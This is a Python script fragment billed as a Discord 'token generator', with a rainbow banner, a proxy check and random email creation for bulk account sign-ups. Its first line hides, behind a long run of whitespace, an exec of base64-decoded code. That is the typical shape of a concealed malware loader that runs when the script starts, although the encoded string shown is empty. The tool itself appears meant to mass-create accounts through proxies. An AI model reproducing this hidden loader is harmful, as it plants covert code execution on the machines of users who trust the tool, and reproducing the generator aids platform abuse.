...
type('System.Title')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
System.Title("Femelles Token Generator ^| Made By F♥m♥ll♥s👑#9215")
Femelles = """
...
TOKEN GEN
              ...
              .      [Discord] https://discord.gg/femelles
              .      [Github]  https://github.com/FemellesV11       
...
> Press Enter..."""
System.Size(200,40)
Anime.Fade(Center.Center(Femelles), Colors.rainbow, Colorate.Vertical, interval=0.020, enter=True)
Anime.Fade(Center.Center(Femelles), Colors.rainbow, Colorate.Vertical, interval=0.020, enter=True)
...
class Booster:
    def __init__(self) -> None:
        ...
        if not len(self.proxies):
            print(f"\n{Fore.RED}[{Fore.RESET}{Fore.MAGENTA}!{Fore.RESET}{Fore.RED}]{Fore.RESET} No proxy found in proxy folder.\n{Fore.RED}[{Fore.RESET}{Fore.MAGENTA}!{Fore.RESET}{Fore.RED}]{Fore.RESET} Please edit the config file in the data folder.")
            time.sleep(10)
            os._exit(0)
    ...
    def __email__(self) -> str:
        ...
        email =  "femelles" + "_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8)) + random.choice(domains)
        return email
